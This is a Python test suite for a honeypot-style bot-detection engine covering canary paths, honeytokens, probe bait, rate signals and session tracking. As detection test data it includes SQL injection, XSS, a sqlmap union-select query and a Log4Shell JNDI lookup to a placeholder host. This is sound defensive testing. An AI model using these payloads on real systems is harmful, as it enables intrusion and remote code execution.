import base64

from tests.helpers import (
    BROWSER_HEADERS,
    CLIENT_IP,
    OTHER_IP,
    SCRIPT_HEADERS,
    make_engine,
    make_seed,
    request,
)
from tr4p.config import Config
from tr4p.engine import LOG_FULL_UNTIL
from tr4p.session import GROUP_PREFIX


def visit(engine, path="/", status=200, content_type="text/html", **kwargs):
    info = request(path, **kwargs)
    verdict = engine.begin(info)
    engine.finish(info, verdict, status, content_type)
    return verdict


def with_cookie(engine, **kwargs):
    """First request without a cookie, then return the cookie we were given."""
    return visit(engine, **kwargs).new_cookie


# ----------------------------------------------------------------- clean traffic

def test_normal_browsing_raises_nothing():
    engine, sink, clock = make_engine()
    cookie = with_cookie(engine)
    for page in range(30):
        clock.tick(4)
        visit(engine, f"/products/{page}", cookie=cookie)
        visit(engine, "/static/site.css", cookie=cookie, is_asset=True)
    assert sink.events == []
    assert sink.sessions == {}
    assert engine.stats()["tiers"] == {"low": 0, "medium": 0, "high": 0, "released": 0}


def test_cookie_round_trip_and_forgery():
    engine, _, _ = make_engine()
    cookie = engine.mint_cookie()
    assert engine.read_cookie(cookie) is not None
    assert len(cookie) == 30 and "." not in cookie
    tampered = ("A" if cookie[0] != "A" else "B") + cookie[1:]
    assert engine.read_cookie(tampered) is None
    assert engine.read_cookie("x" * 30) is None
    assert engine.read_cookie("") is None
    assert engine.read_cookie(None) is None
    other, _, _ = make_engine(seed=make_seed(99))
    assert other.read_cookie(cookie) is None


def test_cookie_is_only_issued_when_missing():
    engine, _, _ = make_engine()
    first = visit(engine)
    assert first.new_cookie
    assert visit(engine, cookie=first.new_cookie).new_cookie is None


def test_cookie_mode_on_signal_waits_for_a_signal():
    config = Config()
    config.session.cookie_mode = "on_signal"
    engine, _, _ = make_engine(config)
    assert visit(engine).new_cookie is None
    assert visit(engine, "/.env", status=404).new_cookie is not None


# ------------------------------------------------------------- two-signal rule

def test_single_canary_hit_only_logs():
    engine, sink, _ = make_engine()
    cookie = with_cookie(engine)
    canary = engine.canaries.current().link_paths[0]
    verdict = visit(engine, canary, cookie=cookie)
    assert verdict.canary is not None
    assert verdict.tier == "low"
    assert [e["signal"] for e in sink.kinds("signal")] == ["canary_path"]
    assert sink.kinds("tier") and not any(e["alert"] for e in sink.events)


def test_repeating_one_signal_never_traps():
    engine, _, clock = make_engine()
    cookie = with_cookie(engine)
    canary = engine.canaries.current().link_paths[0]
    for _ in range(200):
        clock.tick(5)
        verdict = visit(engine, canary, cookie=cookie)
    assert verdict.tier == "low"


def test_canary_plus_second_signal_escalates():
    engine, sink, _ = make_engine()
    canary = engine.canaries.current().link_paths[0]
    verdict = visit(engine, canary, headers=SCRIPT_HEADERS)
    assert verdict.tier == "medium"          # canary + automation client = 55
    alerts = [e for e in sink.events if e["alert"]]
    assert len(alerts) == 1 and alerts[0]["kind"] == "tier"
    assert engine.stats()["alerts"] == 1


def test_canary_plus_speed_reaches_high():
    engine, _, _ = make_engine()
    cookie = with_cookie(engine)
    visit(engine, engine.canaries.current().link_paths[0], cookie=cookie)
    for n in range(45):
        verdict = visit(engine, f"/page/{n}", cookie=cookie)
    assert verdict.tier == "high"


def test_tier_never_drops_by_itself():
    engine, _, clock = make_engine()
    cookie = with_cookie(engine)
    visit(engine, engine.canaries.current().link_paths[0], cookie=cookie)
    for n in range(45):
        visit(engine, f"/page/{n}", cookie=cookie)
    clock.tick(3600)
    assert visit(engine, "/", cookie=cookie).tier == "high"


# --------------------------------------------------------------- signal types

def test_hidden_instruction_needs_its_token():
    engine, sink, _ = make_engine()
    path = engine.canaries.current().instruction_path
    token = engine.canaries.instruction_token("anyone")
    visit(engine, f"{path}?ref={token}", cookie=with_cookie(engine))
    assert sink.kinds("signal")[-1]["signal"] == "hidden_instruction"
    visit(engine, f"{path}?ref=deadbeef", cookie=with_cookie(engine, ip=OTHER_IP), ip=OTHER_IP)
    assert sink.kinds("signal")[-1]["signal"] == "canary_path"


def test_robots_only_path_is_a_robots_violation():
    engine, sink, _ = make_engine()
    visit(engine, engine.canaries.current().robots_only_path, cookie=with_cookie(engine))
    assert sink.kinds("signal")[-1]["signal"] == "robots_violation"


def test_reading_robots_then_two_listed_paths_stays_low():
    # A curious human clicking through robots.txt entries is one kind of
    # evidence, however many entries they open.
    engine, _, _ = make_engine()
    cookie = with_cookie(engine)
    current = engine.canaries.current()
    visit(engine, current.robots_only_path, cookie=cookie)
    verdict = visit(engine, current.link_paths[0], cookie=cookie)
    assert verdict.tier == "low"


def test_bait_always_signals_whatever_upstream_says():
    engine, sink, _ = make_engine()
    verdict = visit(engine, "/.env", status=200, cookie=with_cookie(engine))
    assert verdict.bait == "always"
    assert sink.kinds("signal")[-1]["signal"] == "probe_path"


def test_bait_if_missing_depends_on_upstream():
    engine, sink, _ = make_engine()
    visit(engine, "/wp-login.php", status=200, cookie=with_cookie(engine))
    assert sink.events == []
    visit(engine, "/wp-login.php", status=404, cookie=with_cookie(engine, ip=OTHER_IP), ip=OTHER_IP)
    assert sink.kinds("signal")[-1]["signal"] == "probe_path"


def test_attack_payload_in_query_body_and_header():
    engine, sink, _ = make_engine()
    cookie = with_cookie(engine)
    visit(engine, "/item?id=1'+or+'1'='1", cookie=cookie)
    visit(engine, "/search", method="POST", body=b"q=<script>alert(1)</script>", cookie=cookie)
    headers = dict(BROWSER_HEADERS, Referer="${jndi:ldap://x.example/a}")
    visit(engine, "/", headers=headers, cookie=cookie)
    assert [e["signal"] for e in sink.kinds("signal")] == ["attack_payload"] * 3
    assert visit(engine, "/", cookie=cookie).tier == "low"


def test_scanner_agent_and_payload_and_speed_reach_high_without_canary():
    engine, _, _ = make_engine()
    headers = {"Host": "shop.example", "User-Agent": "sqlmap/1.8 (https://sqlmap.org)"}
    verdict = visit(engine, "/item?id=1+union+select+1,2", headers=headers)
    assert verdict.tier == "medium"
    for n in range(45):
        verdict = visit(engine, f"/item?id={n}+union+select+1,2", headers=headers)
    assert verdict.tier == "high"


def test_agent_signals_are_raised_once():
    engine, sink, _ = make_engine()
    for _ in range(5):
        visit(engine, headers=SCRIPT_HEADERS)
    assert [e["signal"] for e in sink.kinds("signal")] == ["generic_client"]


def test_browser_header_anomaly():
    engine, sink, _ = make_engine()
    headers = {k: v for k, v in BROWSER_HEADERS.items() if k != "Accept-Language"}
    visit(engine, headers=headers)
    assert sink.kinds("signal")[-1]["signal"] == "header_anomaly"


def test_rate_signal_ignores_assets_and_resets_per_window():
    engine, sink, clock = make_engine()
    cookie = with_cookie(engine)
    for n in range(200):
        visit(engine, f"/img/{n}.png", cookie=cookie, is_asset=True)
    assert sink.events == []
    for n in range(40):
        visit(engine, f"/p/{n}", cookie=cookie)
    assert sink.events == []
    clock.tick(11)
    for n in range(40):
        visit(engine, f"/p/{n}", cookie=cookie)
    assert sink.events == []
    visit(engine, "/p/last", cookie=cookie)
    assert sink.kinds("signal")[-1]["signal"] == "rate"


def test_not_found_burst():
    engine, sink, clock = make_engine()
    cookie = with_cookie(engine)
    for n in range(16):
        clock.tick(1)
        visit(engine, f"/guess-{n}", status=404, cookie=cookie)
    assert [e["signal"] for e in sink.kinds("signal")] == ["not_found_burst"]


def test_missing_assets_do_not_count_as_not_found_burst():
    engine, sink, clock = make_engine()
    cookie = with_cookie(engine)
    for n in range(60):
        visit(engine, f"/img/missing-{n}.png", status=404, cookie=cookie, is_asset=True)
    assert sink.events == []


def test_auth_burst():
    engine, sink, clock = make_engine()
    cookie = with_cookie(engine)
    for _ in range(11):
        clock.tick(2)
        visit(engine, "/account/login", method="POST", body=b"user=a&password=b", cookie=cookie)
    assert [e["signal"] for e in sink.kinds("signal")] == ["auth_burst"]


def test_no_assets_signal_and_asset_fetch_prevents_it():
    engine, sink, clock = make_engine()
    cookie = with_cookie(engine)
    for n in range(9):
        clock.tick(3)
        visit(engine, f"/article/{n}", cookie=cookie)
    assert [e["signal"] for e in sink.kinds("signal")] == ["no_assets"]

    other = with_cookie(engine, ip=OTHER_IP)
    visit(engine, "/site.css", cookie=other, ip=OTHER_IP, is_asset=True)
    for n in range(20):
        clock.tick(3)
        visit(engine, f"/article/{n}", cookie=other, ip=OTHER_IP)
    assert len(sink.kinds("signal")) == 1


def test_honeytoken_use_is_high_at_once():
    engine, sink, _ = make_engine()
    secret = engine.honeytokens.value("api_key")
    verdict = visit(engine, "/api/orders", headers=dict(BROWSER_HEADERS, Authorization=f"Bearer {secret}"),
                    cookie=with_cookie(engine))
    assert verdict.tier == "high"
    assert sink.kinds("signal")[-1]["signal"] == "honeytoken"
    # The secret itself is never written to the log.
    assert all(secret not in str(event) for event in sink.events)


def test_honeytoken_in_basic_auth_form_and_query():
    for build in (
        lambda s: {"headers": dict(BROWSER_HEADERS, Authorization="Basic " + base64.b64encode(f"admin:{s}".encode()).decode())},
        lambda s: {"method": "POST", "body": f"user=admin&password={s}".encode()},
        lambda s: {"path": f"/api?key={s}"},
    ):
        engine, _, _ = make_engine()
        kwargs = build(engine.honeytokens.value("admin_password"))
        path = kwargs.pop("path", "/login")
        assert visit(engine, path, cookie=with_cookie(engine), **kwargs).tier == "high"


# ------------------------------------------------------- identity and stickiness

def test_whitelisted_address_bypasses_everything():
    config = Config()
    config.whitelist = ["203.0.113.0/24"]
    engine, sink, _ = make_engine(config)
    verdict = visit(engine, "/.env?x=<script>", headers=SCRIPT_HEADERS)
    assert verdict.whitelisted and verdict.session is None and verdict.new_cookie is None
    assert sink.events == []
    assert visit(engine, "/.env", headers=SCRIPT_HEADERS, ip=OTHER_IP).tier == "medium"


def test_same_address_different_browsers_are_separate():
    engine, _, _ = make_engine()
    canary = engine.canaries.current().link_paths[0]
    attacker = visit(engine, canary, headers=SCRIPT_HEADERS)
    assert attacker.tier == "medium"
    neighbour = visit(engine, "/")           # same NAT address, real browser
    assert neighbour.tier == "none"
    assert neighbour.session.key != attacker.session.key


def test_cookieless_client_is_tracked_as_a_group():
    engine, _, _ = make_engine()
    first = visit(engine, "/a", headers=SCRIPT_HEADERS)
    second = visit(engine, "/b", headers=SCRIPT_HEADERS)
    assert first.session is second.session
    assert first.session.key.startswith(GROUP_PREFIX)


def test_dropping_the_cookie_does_not_reset_a_trapped_session():
    engine, _, _ = make_engine()
    cookie = with_cookie(engine, headers=SCRIPT_HEADERS)
    canary = engine.canaries.current().link_paths[0]
    assert visit(engine, canary, headers=SCRIPT_HEADERS, cookie=cookie).tier == "medium"
    # Cookie thrown away: the cookie-less group carries the state.
    fresh = visit(engine, "/", headers=SCRIPT_HEADERS)
    assert fresh.tier == "medium"
    # A brand new cookie obtained afterwards inherits it too.
    assert visit(engine, "/", headers=SCRIPT_HEADERS, cookie=fresh.new_cookie).tier == "medium"


def test_low_tier_is_not_inherited_by_new_cookies():
    engine, _, _ = make_engine()
    canary = engine.canaries.current().link_paths[0]
    first = visit(engine, canary)            # cookie-less, one signal
    assert first.tier == "low"
    assert visit(engine, "/", cookie=first.new_cookie).tier == "none"


# ------------------------------------------------------------ release and state

def test_release_clears_tier_and_survives_new_signals():
    engine, sink, _ = make_engine()
    canary = engine.canaries.current().link_paths[0]
    cookie = with_cookie(engine, headers=SCRIPT_HEADERS)
    trapped = visit(engine, canary, headers=SCRIPT_HEADERS, cookie=cookie)
    assert trapped.tier == "medium"
    assert engine.release(trapped.session.key)
    assert visit(engine, canary, headers=SCRIPT_HEADERS, cookie=cookie).tier == "none"
    assert visit(engine, "/", headers=SCRIPT_HEADERS).tier == "none"   # group released too
    assert sink.kinds("release")
    assert engine.stats()["tiers"]["released"] == 2
    assert engine.release(trapped.session.key, released=False)
    assert visit(engine, "/", headers=SCRIPT_HEADERS, cookie=cookie).tier == "medium"
    assert not engine.release("unknown-key")


def test_flagged_sessions_survive_a_restart():
    engine, sink, _ = make_engine()
    canary = engine.canaries.current().link_paths[0]
    cookie = with_cookie(engine, headers=SCRIPT_HEADERS)
    visit(engine, canary, headers=SCRIPT_HEADERS, cookie=cookie)
    restarted, _, _ = make_engine()
    assert restarted.restore(list(sink.sessions.values()) + [{"broken": True}]) == 2
    assert visit(restarted, "/", headers=SCRIPT_HEADERS, cookie=cookie).tier == "medium"


def test_flood_of_one_signal_is_sampled_in_the_log():
    engine, sink, clock = make_engine()
    cookie = with_cookie(engine)
    for _ in range(500):
        clock.tick(5)
        visit(engine, "/.env", status=404, cookie=cookie)
    probes = [e for e in sink.kinds("signal") if e["signal"] == "probe_path"]
    assert LOG_FULL_UNTIL < len(probes) < 60
    assert engine.stats()["by_type"]["probe_path"] == 500


def test_long_paths_and_agents_are_truncated_in_events():
    engine, sink, _ = make_engine()
    headers = {"Host": "shop.example", "User-Agent": "curl/" + "9" * 5000}
    visit(engine, "/.env?" + "a" * 5000, status=404, headers=headers)
    assert all(len(e["path"]) <= 300 and len(e["user_agent"]) <= 200 for e in sink.events)


def test_verified_crawler_is_exempt_and_unverified_is_not():
    engine, sink, _ = make_engine()
    asked = []
    engine.crawler_hook = asked.append
    headers = {"Host": "shop.example",
               "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}
    current = engine.canaries.current()
    visit(engine, current.link_paths[0], headers=headers)
    assert len(asked) == 1 and asked[0].crawler == "pending"
    for n in range(45):
        verdict = visit(engine, f"/p/{n}", headers=headers)
    assert verdict.tier == "high"
    engine.crawler_result(asked[0].key, True)
    assert visit(engine, "/", headers=headers).tier == "none"

    fake = dict(headers)
    visit(engine, current.link_paths[0], headers=fake, ip=OTHER_IP)
    for n in range(45):
        visit(engine, f"/p/{n}", headers=fake, ip=OTHER_IP)
    engine.crawler_result(asked[1].key, False)
    assert visit(engine, "/", headers=fake, ip=OTHER_IP).tier == "high"


def test_session_table_is_bounded():
    config = Config()
    config.session.max_tracked = 100
    engine, _, _ = make_engine(config)
    for n in range(1000):
        visit(engine, headers={"Host": "shop.example", "User-Agent": f"Mozilla/5.0 Chrome/{n}",
                               "Accept": "*/*", "Accept-Language": "en", "Accept-Encoding": "gzip"})
    assert len(engine.sessions) <= 100


def test_sweep_drops_idle_clean_sessions():
    engine, _, clock = make_engine()
    visit(engine)
    visit(engine, "/.env", status=404, ip=OTHER_IP)
    clock.tick(3600)
    assert engine.sweep() == 1
    assert len(engine.sessions) == 1
